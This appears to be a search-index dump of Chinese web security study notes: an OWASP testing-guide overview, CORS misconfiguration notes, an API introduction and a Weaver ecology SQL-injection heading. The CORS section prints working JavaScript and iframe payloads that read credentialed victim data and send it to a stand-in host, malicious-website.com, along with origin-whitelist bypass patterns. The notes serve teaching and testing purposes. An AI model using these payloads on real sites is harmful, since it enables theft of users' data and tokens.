WAF\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u8bbf\u95ee\u540e\u7aef\u670d\u52a1\u5668\u6765\u7ed5\u8fc7\u5b83\uff0c\u4f7f\u7528\u5185\u5bb9\u4ea4\u4ed8\u7f51\u7edc\u90e8\u5206\u4e2d\u8ba8\u8bba\u7684\u76f8\u540c\u65b9\u6cd5\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E6%A6%82%E8%BF%B0/","title":"WEB\u5b89\u5168\u6d4b\u8bd5\u6307\u5357","text":"<p>\u6b64\u6587\u7ffb\u8bd1\u81eaOWASP WEB\u5b89\u5168\u6d4b\u8bd5\u6307\u5357\u9879\u76ee</p> <p>\u672c\u8282\u63cf\u8ff0\u4e86 <code>OWASP Web</code> \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u65b9\u6cd5\uff0c\u5e76\u89e3\u91ca\u4e86\u5982\u4f55\u6d4b\u8bd5\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7531\u4e8e\u5df2\u8bc6\u522b\u7684\u5b89\u5168\u63a7\u5236\u7f3a\u9677\u800c\u5b58\u5728\u6f0f\u6d1e\u7684\u8bc1\u636e\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E6%A6%82%E8%BF%B0/#web_1","title":"\u4ec0\u4e48\u662f WEB \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\uff1f","text":"<p>\u5b89\u5168\u6d4b\u8bd5\u662f\u4e00\u79cd\u901a\u8fc7\u7cfb\u7edf\u5730\u9a8c\u8bc1\u548c\u9a8c\u8bc1\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u63a7\u5236\u7684\u6709\u6548\u6027\u6765\u8bc4\u4f30\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7f51\u7edc\u5b89\u5168\u6027\u7684\u65b9\u6cd5\u3002Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u4ec5\u4fa7\u91cd\u4e8e\u8bc4\u4f30 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u5168\u6027\u3002\u8be5\u8fc7\u7a0b\u6d89\u53ca\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u4efb\u4f55\u5f31\u70b9\u3001\u6280\u672f\u7f3a\u9677\u6216\u6f0f\u6d1e\u8fdb\u884c\u4e3b\u52a8\u5206\u6790\u3002\u53d1\u73b0\u7684\u4efb\u4f55\u5b89\u5168\u95ee\u9898\u5c06\u8fde\u540c\u5f71\u54cd\u8bc4\u4f30\u3001\u7f13\u89e3\u5efa\u8bae\u6216\u6280\u672f\u89e3\u51b3\u65b9\u6848\u4e00\u8d77\u63d0\u4ea4\u7ed9\u7cfb\u7edf\u6240\u6709\u8005\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E6%A6%82%E8%BF%B0/#_1","title":"\u4ec0\u4e48\u662f\u6f0f\u6d1e\uff1f","text":"<p><code>\u6f0f\u6d1e</code>\u662f\u7cfb\u7edf\u8bbe\u8ba1\u3001\u5b9e\u65bd\u3001\u64cd\u4f5c\u6216\u7ba1\u7406\u4e2d\u7684\u7f3a\u9677\u6216\u5f31\u70b9\uff0c\u53ef\u88ab\u7528\u6765\u7834\u574f\u7cfb\u7edf\u7684\u5b89\u5168\u76ee\u6807\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E6%A6%82%E8%BF%B0/#_2","title":"\u4ec0\u4e48\u662f\u5a01\u80c1\uff1f","text":"<p><code>\u5a01\u80c1</code>\u662f\u4efb\u4f55\u53ef\u80fd\u635f\u5bb3\u5e94\u7528\u7a0b\u5e8f\u62e5\u6709\u7684\u8d44\u4ea7\uff08\u6709\u4ef7\u503c\u7684\u8d44\u6e90\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u6216\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6570\u636e\uff09\u7684\u4efb\u4f55\u4e8b\u7269\uff08\u6076\u610f\u7684\u5916\u90e8\u653b\u51fb\u8005\u3001\u5185\u90e8\u7528\u6237\u3001\u7cfb\u7edf\u4e0d\u7a33\u5b9a\u7b49\uff09\u6f0f\u6d1e\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E6%A6%82%E8%BF%B0/#_3","title":"\u4ec0\u4e48\u662f\u6d4b\u8bd5\uff1f","text":"<p><code>\u6d4b\u8bd5</code>\u662f\u8bc1\u660e\u5e94\u7528\u7a0b\u5e8f\u6ee1\u8db3\u5176\u5229\u76ca\u76f8\u5173\u8005\u7684\u5b89\u5168\u8981\u6c42\u7684\u64cd\u4f5c\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E6%A6%82%E8%BF%B0/#_4","title":"\u7f16\u5199\u672c\u6307\u5357\u7684\u65b9\u6cd5","text":"<p>OWASP \u65b9\u6cd5\u662f\u5f00\u653e\u548c\u534f\u4f5c\u7684\uff1a</p> <ul> <li>\u5f00\u653e\uff1a\u6bcf\u4e00\u4f4d\u5b89\u5168\u4e13\u5bb6\u90fd\u53ef\u4ee5\u5e26\u7740\u4ed6\u4eec\u5728\u9879\u76ee\u4e2d\u7684\u7ecf\u9a8c\u53c2\u4e0e\u3002\u4e00\u5207\u90fd\u662f\u514d\u8d39\u7684\u3002</li> <li>\u534f\u4f5c\uff1a\u5728\u64b0\u5199\u6587\u7ae0\u4e4b\u524d\u8fdb\u884c\u5934\u8111\u98ce\u66b4\uff0c\u4ee5\u4fbf\u56e2\u961f\u53ef\u4ee5\u5206\u4eab\u60f3\u6cd5\u5e76\u5236\u5b9a\u9879\u76ee\u7684\u96c6\u4f53\u613f\u666f\u3002\u8fd9\u610f\u5473\u7740\u7c97\u7565\u7684\u5171\u8bc6\u3001\u66f4\u5e7f\u6cdb\u7684\u53d7\u4f17\u548c\u66f4\u591a\u7684\u53c2\u4e0e\u3002</li> </ul> <p>\u8fd9\u79cd\u65b9\u6cd5\u503e\u5411\u4e8e\u521b\u5efa\u4e00\u4e2a\u5b9a\u4e49\u597d\u7684\u6d4b\u8bd5\u65b9\u6cd5\u8bba\uff0c\u5b83\u5c06\u662f\uff1a</p> <ul> <li>\u6301\u7eed\u7684</li> <li>\u53ef\u91cd\u73b0</li> <li>\u4e25\u683c\u7684</li> <li>\u5728\u8d28\u91cf\u63a7\u5236\u4e0b</li> </ul> <p>\u8981\u89e3\u51b3\u7684\u95ee\u9898\u5df2\u5b8c\u6574\u8bb0\u5f55\u548c\u6d4b\u8bd5\u3002\u4f7f\u7528\u4e00\u79cd\u65b9\u6cd5\u6765\u6d4b\u8bd5\u6240\u6709\u5df2\u77e5\u6f0f\u6d1e\u5e76\u8bb0\u5f55\u6240\u6709\u5b89\u5168\u6d4b\u8bd5\u6d3b\u52a8\u975e\u5e38\u91cd\u8981\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E6%A6%82%E8%BF%B0/#owasp","title":"\u4ec0\u4e48\u662f OWASP \u6d4b\u8bd5\u65b9\u6cd5\uff1f","text":"<p>\u5b89\u5168\u6d4b\u8bd5\u6c38\u8fdc\u4e0d\u4f1a\u662f\u4e00\u95e8\u7cbe\u786e\u7684\u79d1\u5b66\uff0c\u53ef\u4ee5\u5b9a\u4e49\u5e94\u6d4b\u8bd5\u7684\u6240\u6709\u53ef\u80fd\u95ee\u9898\u7684\u5b8c\u6574\u5217\u8868\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5b89\u5168\u6d4b\u8bd5\u53ea\u662f\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u6d4b\u8bd5 Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6027\u7684\u4e00\u79cd\u9002\u5f53\u6280\u672f\u3002\u8fd9\u4e2a\u9879\u76ee\u7684<code>\u76ee\u6807</code>\u662f\u6536\u96c6\u6240\u6709\u53ef\u80fd\u7684\u6d4b\u8bd5\u6280\u672f\uff0c\u89e3\u91ca\u8fd9\u4e9b\u6280\u672f\uff0c\u5e76\u4fdd\u6301\u6307\u5357\u66f4\u65b0\u3002OWASP Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u65b9\u6cd5\u57fa\u4e8e<code>\u9ed1\u76d2</code>\u65b9\u6cd5\u3002\u6d4b\u8bd5\u4eba\u5458\u5bf9\u8981\u6d4b\u8bd5\u7684\u5e94\u7528\u7a0b\u5e8f\u4e00\u65e0\u6240\u77e5\u6216\u77e5\u4e4b\u751a\u5c11\u3002</p> <p>\u6d4b\u8bd5\u6a21\u578b\u5305\u62ec\uff1a</p> <ul> <li>\u6d4b\u8bd5\u4eba\u5458\uff1a\u8c01\u6267\u884c\u6d4b\u8bd5\u6d3b\u52a8</li> <li>\u5de5\u5177\u548c\u65b9\u6cd5\uff1a\u672c\u6d4b\u8bd5\u6307\u5357\u9879\u76ee\u7684\u6838\u5fc3</li> <li>\u5e94\u7528\uff1a\u8981\u6d4b\u8bd5\u7684\u9ed1\u76d2</li> </ul> <p>\u6d4b\u8bd5\u53ef\u5206\u4e3a\u88ab\u52a8\u6216\u4e3b\u52a8\uff1a</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E6%A6%82%E8%BF%B0/#_5","title":"\u88ab\u52a8\u6d4b\u8bd5","text":"<p>\u5728<code>\u88ab\u52a8\u6d4b\u8bd5</code>\u671f\u95f4\uff0c\u6d4b\u8bd5\u4eba\u5458\u8bd5\u56fe\u7406\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u903b\u8f91\u5e76\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u63a2\u7d22\u5e94\u7528\u7a0b\u5e8f\u3002\u5de5\u5177\u53ef\u7528\u4e8e\u4fe1\u606f\u6536\u96c6\u3002\u4f8b\u5982\uff0c<code>HTTP</code> \u4ee3\u7406\u53ef\u7528\u4e8e\u89c2\u5bdf\u6240\u6709 HTTP \u8bf7\u6c42\u548c\u54cd\u5e94\u3002\u5728\u6b64\u9636\u6bb5\u7ed3\u675f\u65f6\uff0c\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u5927\u81f4\u4e86\u89e3\u7cfb\u7edf\u7684\u6240\u6709\u8bbf\u95ee\u70b9\u548c\u529f\u80fd\uff08\u4f8b\u5982\uff0cHTTP \u6807\u5934\u3001\u53c2\u6570\u3001cookie\u3001API\u3001\u6280\u672f\u4f7f\u7528/\u6a21\u5f0f\u7b49\uff09\u3002\u4fe1\u606f\u6536\u96c6\u90e8\u5206\u89e3\u91ca\u4e86\u5982\u4f55\u6267\u884c\u88ab\u52a8\u6d4b\u8bd5\u3002</p> <p>\u4f8b\u5982\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u5728\u4ee5\u4e0b URL \u627e\u5230\u4e00\u4e2a\u9875\u9762\uff1a<code>https://www.example.com/login/auth_form</code></p> <p>\u8fd9\u53ef\u80fd\u8868\u793a\u5e94\u7528\u7a0b\u5e8f\u8bf7\u6c42\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u8eab\u4efd\u9a8c\u8bc1\u8868\u5355\u3002</p> <p>\u4ee5\u4e0b\u53c2\u6570\u8868\u793a\u5e94\u7528\u7a0b\u5e8f\u7684\u4e24\u4e2a\u8bbf\u95ee\u70b9\uff1a<code>https://www.example.com/appx?a=1&amp;b=1</code></p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u663e\u793a\u4e24\u4e2a\u8bbf\u95ee\u70b9\uff08\u53c2\u6570<code>a</code>\u548c<code>b</code>\uff09\u3002\u5728\u8fd9\u4e2a\u9636\u6bb5\u627e\u5230\u7684\u6240\u6709\u8f93\u5165\u70b9\u4ee3\u8868\u4e00\u4e2a\u6d4b\u8bd5\u76ee\u6807\u3002\u8ddf\u8e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u76ee\u5f55\u6216\u8c03\u7528\u6811\u4ee5\u53ca\u6240\u6709\u8bbf\u95ee\u70b9\u5728\u4e3b\u52a8\u6d4b\u8bd5\u671f\u95f4\u53ef\u80fd\u5f88\u6709\u7528\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E6%A6%82%E8%BF%B0/#_6","title":"\u4e3b\u52a8\u6d4b\u8bd5","text":"<p>\u5728\u4e3b\u52a8\u6d4b\u8bd5\u671f\u95f4\uff0c\u6d4b\u8bd5\u4eba\u5458\u5f00\u59cb\u4f7f\u7528\u4ee5\u4e0b\u90e8\u5206\u4e2d\u63cf\u8ff0\u7684\u65b9\u6cd5\u3002</p> <p>\u4e3b\u52a8\u6d4b\u8bd5\u96c6\u5df2\u5206\u4e3a 12 \u7c7b\uff1a</p> <ul> <li>\u4fe1\u606f\u6536\u96c6</li> <li>\u914d\u7f6e\u90e8\u7f72\u7ba1\u7406\u6d4b\u8bd5</li> <li>\u8eab\u4efd\u7ba1\u7406\u6d4b\u8bd5</li> <li>\u8ba4\u8bc1\u6d4b\u8bd5</li> <li>\u6388\u6743\u6d4b\u8bd5</li> <li>\u4f1a\u8bdd\u7ba1\u7406\u6d4b\u8bd5</li> <li>\u8f93\u5165\u9a8c\u8bc1\u6d4b\u8bd5</li> <li>\u9519\u8bef\u5904\u7406</li> <li>\u5bc6\u7801\u5b66</li> <li>\u4e1a\u52a1\u903b\u8f91\u6d4b\u8bd5</li> <li>\u5ba2\u6237\u7aef\u6d4b\u8bd5</li> <li>API\u6d4b\u8bd5</li> </ul>"},{"location":"WEB%E5%AE%89%E5%85%A8/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/","title":"CORS\u5b89\u5168\u95ee\u9898","text":""},{"location":"WEB%E5%AE%89%E5%85%A8/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_1","title":"\u524d\u7f6e\u77e5\u8bc6\uff1a","text":""},{"location":"WEB%E5%AE%89%E5%85%A8/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#cross-origin-resource-sharing","title":"\u8de8\u57df\u8d44\u6e90\u5171\u4eab(Cross-origin resource sharing)","text":"<p>\u4f5c\u7528\uff1a\u4f7f\u7528HTTP\u5934\u544a\u8bc9\u6d4f\u89c8\u5668\u51c6\u8bb8\u8bbf\u95ee\u4e0d\u540c\u6e90\u670d\u52a1\u5668\u4e0a\u7684\u6307\u5b9a\u8d44\u6e90\uff0c \u5141\u8bb8\u6d4f\u89c8\u5668\u5411\u8de8\u57df(\u4e0d\u540c\u6e90)\u670d\u52a1\u5668\uff0c\u53d1\u8d77<code>XMLHttpRequest</code>\u8bf7\u6c42\uff0c\u4ece\u800c\u514b\u670dAJAX\u53ea\u80fd\u540c\u6e90\u4f7f\u7528\u7684\u9650\u5236\u3002\u9700\u8981\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u540c\u65f6\u652f\u6301\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#same-origin-policy","title":"\u540c\u6e90\u7b56\u7565(Same-origin policy)","text":"<p>\u7f51\u7edc\u6d4f\u89c8\u5668\u5b89\u5168\u673a\u5236\uff0c\u9632\u6b62\u7f51\u7ad9\u76f8\u4e92\u653b\u51fb\u3002\u9650\u5236\u6e90\u4e0a\u7684\u811a\u672c\u8bbf\u95ee\u53e6\u4e2a\u6e90\u4e0a\u7684\u6570\u636e\u3002\u7531URI\u3001\u534f\u8bae\u3001\u7aef\u53e3\u53f7\u7ec4\u6210\u5355\u4e2a\u6e90\u3002</p> <p>\u540c\u6e90\u7b56\u7565\u53ef\u4ee5\u9650\u5236\u4e0d\u540c\u6e90\u5e94\u7528\u4e4b\u95f4\u7684\u6587\u672c\u6216\u811a\u672c\u4ea4\u4e92\uff0c\u53ef\u7528\u4e8e\u9694\u79bb\u6f5c\u5728\u6076\u610f\u6587\u4ef6\u7684\u91cd\u8981\u5b89\u5168\u673a\u5236\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#cors_1","title":"CORS\u6807\u5934\u4ee5\u53ca\u529f\u80fd\u5b9e\u73b0","text":"<p><code>Access-Control-Allow-Origin: *</code> \u6807\u8bc6\u5141\u8bb8\u7684\u8bf7\u6c42\u6765\u6e90\u3002</p> <p>\u5141\u8bb8\u591a\u4e2a\u6765\u6e90\u3001<code>null</code>\u6216\u901a\u914d\u7b26<code>*</code>\u3002\u4f46\u6d4f\u89c8\u5668\u4ec5\u652f\u6301\u5355\u4e2a\uff0c\u5e76\u4e14\u901a\u914d\u7b26<code>*</code>\u4e5f\u4f1a\u53d7\u5230\u9650\u5236\u3002</p> <p><code>*</code>\u4e0d\u80fd\u4e0e\u51ed\u636e\u7684\u8de8\u8d8a\u4f20\u8f93\u7ed3\u5408\u4f7f\u7528\u3002</p> <p>\u9274\u4e8e\u6b64\u9650\u5236\uff0c\u4e00\u4e9bWeb\u670d\u52a1\u5668\u4f1a\u6839\u636e\u5ba2\u6237\u7aef\u6307\u5b9a\u7684\u6765\u6e90\u52a8\u6001\u521b\u5efa\u6807\u5934\uff0c\u8fd9\u662f\u4e0d\u5b89\u5168\u7684\u3002</p> <p><code>Access-Control-Allow-Credentials: true</code> \u5141\u8bb8\u5c06cookie\u6216\u76f8\u5173\u51ed\u636e\u4f20\u9012\u7ed9\u6765\u6e90\u65f6\u8bfb\u53d6\u54cd\u5e94\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#_2","title":"\u9884\u68c0\u67e5","text":"<p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u5f53\u8de8\u57df\u8bf7\u6c42\u5305\u542b\u975e\u6807\u51c6\u7684 HTTP \u65b9\u6cd5\u6216\u6807\u5934\u65f6\uff0c\u8de8\u57df\u8bf7\u6c42\u4e4b\u524d\u4f1a\u51fa\u73b0\u4f7f\u7528\u8be5<code>OPTIONS</code>\u65b9\u6cd5\u7684\u8bf7\u6c42\uff0c\u5e76\u4e14 CORS \u534f\u8bae\u9700\u8981\u5148\u68c0\u67e5\u5141\u8bb8\u54ea\u4e9b\u65b9\u6cd5\u548c\u6807\u5934\u5141\u8bb8\u8de8\u57df\u8bf7\u6c42\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#cors_2","title":"CORS\u5229\u7528","text":"<p>\u914d\u7f6e\u8fc7\u4e8e\u5bbd\u677e\uff0c\u5bfc\u81f4\u53ef\u5229\u7528\u6f0f\u6d1e</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#acaoorigin","title":"ACAO\u6807\u5934\u7531\u8bf7\u6c42\u5934Origin\u751f\u6210","text":"<p>\u5bfc\u81f4\u4efb\u4f55\u57df\u5747\u53ef\u8bbf\u95ee\u7ad9\u70b9\u8d44\u6e90,\u5982\u679c\u54cd\u5e94\u5305\u542b\u4efb\u4f55\u654f\u611f\u4fe1\u606f\uff0c\u4f8b\u5982 API \u5bc6\u94a5\u6216CSRF \u4ee4\u724c\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u5728\u60a8\u7684\u7f51\u7ad9\u4e0a\u653e\u7f6e\u4ee5\u4e0b\u811a\u672c\u6765\u68c0\u7d22\u5b83\uff1a</p> <pre><code>var req = new XMLHttpRequest();\nreq.onload = reqListener;\nreq.open('get','https://vulnerable-website.com/sensitive-victim-data',true);\nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\n   location='//malicious-website.com/log?key='+this.responseText;\n};\n</code></pre>"},{"location":"WEB%E5%AE%89%E5%85%A8/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#origin","title":"Origin\u89e3\u6790\u9519\u8bef","text":"<p>\u5b9e\u65bd CORS \u6e90\u767d\u540d\u5355\u65f6\u7ecf\u5e38\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u767d\u540d\u5355\u89c4\u5219\u901a\u5e38\u901a\u8fc7\u5339\u914d URL \u524d\u7f00\u6216\u540e\u7f00\uff0c\u6216\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5b9e\u73b0\u3002\u5b9e\u65bd\u4e2d\u7684\u4efb\u4f55\u9519\u8bef\u90fd\u53ef\u80fd\u5bfc\u81f4\u8bbf\u95ee\u88ab\u6388\u4e88\u610f\u5916\u7684\u5916\u90e8\u57df\u3002</p> <pre><code>normal-website.com  //\u4ee5\u4e0b\u7ed3\u5c3e\u57df\u540d\u5141\u8bb8\u8bbf\u95ee\ntestnormal-website.com  //\u7ed5\u8fc7\n\nnormal-website.com  //\u5bf9\u5f53\u524d\u6240\u5728\u57df\u5141\u8bb8\u8bbf\u95ee\nnormal-website.com.test.com     //\u7ed5\u8fc7\n</code></pre>"},{"location":"WEB%E5%AE%89%E5%85%A8/CORS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#null","title":"\u5217\u5165\u767d\u540d\u5355\u7684 null \u539f\u59cb\u503c","text":"<p>Origin \u6807\u5934\u7684\u89c4\u8303\u652f\u6301 value <code>null</code>\u3002\u6d4f\u89c8\u5668\u53ef\u80fd\u4f1a\u5728\u5404\u79cd\u5f02\u5e38\u60c5\u51b5\u4e0b\u53d1\u9001 Origin \u6807\u5934\u4e2d\u7684\u503c\uff1a</p> <ul> <li>\u8de8\u57df\u91cd\u5b9a\u5411\u3002</li> <li>\u6765\u81ea\u5e8f\u5217\u5316\u6570\u636e\u7684\u8bf7\u6c42\u3002</li> <li><code>file:</code>\u4f7f\u7528\u534f\u8bae \u8bf7\u6c42\u3002</li> <li>\u6c99\u76d2\u5316\u7684\u8de8\u57df\u8bf7\u6c42\u3002</li> </ul> <p>\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5c06<code>null</code>\u6e90\u5217\u5165\u767d\u540d\u5355\u4ee5\u652f\u6301\u5e94\u7528\u7a0b\u5e8f\u7684\u672c\u5730\u5f00\u53d1\u3002\u4f8b\u5982\uff0c\u5047\u8bbe\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u63a5\u6536\u5230\u4ee5\u4e0b\u8de8\u57df\u8bf7\u6c42\uff1a</p> <pre><code>GET /sensitive-victim-data Host: vulnerable-website.com Origin: null\n</code></pre> <p>\u670d\u52a1\u5668\u54cd\u5e94\uff1a</p> <pre><code>HTTP/1.1 200 OK Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true\n</code></pre> <p><code>null</code>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u6280\u5de7\u6765\u751f\u6210\u5305\u542bOrigin \u6807\u5934 \u4e2d\u7684\u503c\u7684\u8de8\u57df\u8bf7\u6c42\u3002\u8fd9\u5c06\u6ee1\u8db3\u767d\u540d\u5355\uff0c\u5bfc\u81f4\u8de8\u57df\u8bbf\u95ee\u3002\u4f8b\u5982\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b<code>iframe</code>\u5f62\u5f0f\u7684\u6c99\u76d2\u8de8\u57df\u8bf7\u6c42\u6765\u5b8c\u6210\uff1a</p> <pre><code>&lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,&lt;script&gt;\nvar req = new XMLHttpRequest();\nreq.onload = reqListener;\nreq.open('get','vulnerable-website.com/sensitive-victim-data',true);\nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\nlocation='malicious-website.com/log?key='+this.responseText;\n};\n&lt;/script&gt;\"&gt;&lt;/iframe&gt;\n</code></pre> <p>CORS \u5e38\u89c1\u6f0f\u6d1e\u70b9\uff1a</p> <ul> <li>1.\u4e92\u8054\u7f51\u5382\u5546\u7684api\u63a5\u53e3\uff1b</li> <li>2.\u804a\u5929\u7684\u7a0b\u5e8f\u7684api\u63a5\u53e3\uff1b</li> <li>3.app\u7684api &lt;\u4e0d\u8fc7\u6709\u4e00\u4e9b\u8bf7\u6c42\u9700\u8981\u5e26\u6709\u4e00\u4e9b\u989d\u5916\u7684\u8bf7\u6c42\u5934\uff0c\u5229\u7528\u8d77\u6765\u6bd4\u8f83\u56f0\u96be&gt;;</li> <li>4.\u533a\u5757\u94fe\u5382\u5546\uff1b</li> </ul>"},{"location":"WEB%E5%AE%89%E5%85%A8/WEB%20Service%20%26%20API%20Attacks/","title":"WEB Service & API Attacks","text":"<p>WEB \u670d\u52a1\u548c API \u653b\u51fb</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/WEB%20Service%20%26%20API%20Attacks/#web-service-api-fundamentals","title":"Web Service &amp; API Fundamentals","text":""},{"location":"WEB%E5%AE%89%E5%85%A8/WEB%20Service%20%26%20API%20Attacks/#introduction-to-web-services-and-apis","title":"Introduction to Web Services and APIs","text":""},{"location":"WEB%E5%AE%89%E5%85%A8/WEB%20Service%20%26%20API%20Attacks/#web-api","title":"web\u670d\u52a1\u548c api \u7b80\u4ecb","text":""},{"location":"WEB%E5%AE%89%E5%85%A8/WEB%20Service%20%26%20API%20Attacks/#web-api_1","title":"Web \u670d\u52a1\u4e0e API \u7684\u533a\u522b","text":"<p><code>web service</code>\u548c<code>application programming interface (API)</code>\u4e0d\u5e94\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u4e92\u6362\u4f7f\u7528\u3002</p> <ul> <li>Web \u670d\u52a1\u662f\u4e00\u79cd\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3 (API)\u3002\u76f8\u53cd\u7684\u60c5\u51b5\u5e76\u4e0d\u603b\u662f\u6b63\u786e\u7684\uff01</li> <li>Web \u670d\u52a1\u9700\u8981\u7f51\u7edc\u6765\u5b9e\u73b0\u5176\u76ee\u6807\u3002API \u5373\u4f7f\u79bb\u7ebf\u4e5f\u53ef\u4ee5\u5b9e\u73b0\u5176\u76ee\u6807\u3002</li> <li>Web\u670d\u52a1\u5f88\u5c11\u5141\u8bb8\u5916\u90e8\u5f00\u53d1\u4eba\u5458\u8bbf\u95ee\uff0c\u5e76\u4e14\u6709\u5f88\u591aAPI\u6b22\u8fce\u5916\u90e8\u5f00\u53d1\u4eba\u5458\u8fdb\u884c\u4fee\u6539\u3002</li> <li>\u51fa\u4e8e\u5b89\u5168\u539f\u56e0\uff0cWeb \u670d\u52a1\u901a\u5e38\u4f7f\u7528 SOAP\u3002API \u53ef\u4ee5\u4f7f\u7528\u4e0d\u540c\u7684\u8bbe\u8ba1\uff0c\u4f8b\u5982 XML-RPC\u3001JSON-RPC\u3001SOAP \u548c REST\u3002</li> <li>Web \u670d\u52a1\u901a\u5e38\u4f7f\u7528 XML \u683c\u5f0f\u8fdb\u884c\u6570\u636e\u7f16\u7801\u3002API \u53ef\u4ee5\u4f7f\u7528\u4e0d\u540c\u7684\u683c\u5f0f\u6765\u5b58\u50a8\u6570\u636e\uff0c\u5176\u4e2d\u6700\u6d41\u884c\u7684\u662f JavaScript \u5bf9\u8c61\u8868\u793a\u6cd5 (JSON)\u3002</li> </ul> <p>Web\u670d\u52a1\u65b9\u6cd5/\u6280\u672f</p> <p>XML-RPC</p> <p>JSON-RPC</p> <p>SOAP</p> <p>\u200b   WS-BPEL</p> <p>\u200b   RESTful</p> <p>\u5b58\u5728\u7c7b\u4f3c\u7684 API \u89c4\u8303/\u534f\u8bae\uff0c\u4f8b\u5982\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528 (RPC)\u3001SOAP\u3001REST\u3001gRPC\u3001GraphQL \u7b49\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/WEB%20Service%20%26%20API%20Attacks/#web-services-description-language-wsdl","title":"Web Services Description Language (WSDL)","text":"<p>WSDL \u662f\u7531 Web \u670d\u52a1\u516c\u5f00\u7684\u57fa\u4e8e XML \u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u901a\u77e5\u5ba2\u6237\u7aef\u6240\u63d0\u4f9b\u7684\u670d\u52a1/\u65b9\u6cd5\uff0c\u5305\u62ec\u5b83\u4eec\u6240\u5728\u7684\u4f4d\u7f6e\u4ee5\u53ca\u65b9\u6cd5\u8c03\u7528\u7ea6\u5b9a\u3002</p> <p>Web \u670d\u52a1\u7684 WSDL \u6587\u4ef6\u4e0d\u5e94\u8be5\u603b\u662f\u53ef\u8bbf\u95ee\u7684\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E6%B3%9B%E5%BE%AE%20ecology%208.x%20%26%26%209.x%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/","title":"\u6cdb\u5fae ecology 8.x &amp;&amp; 9.x \u524d\u53f0SQL\u6ce8\u5165","text":"<ul> <li>\u6cdb\u5fae ecology 9.x \u8865\u4e01\u7248\u672c\u53f7 &lt;= v10.56</li> <li>\u6cdb\u5fae ecology 8.x \u8865\u4e01\u7248\u672c\u53f7 &lt;= v10.56</li> </ul> 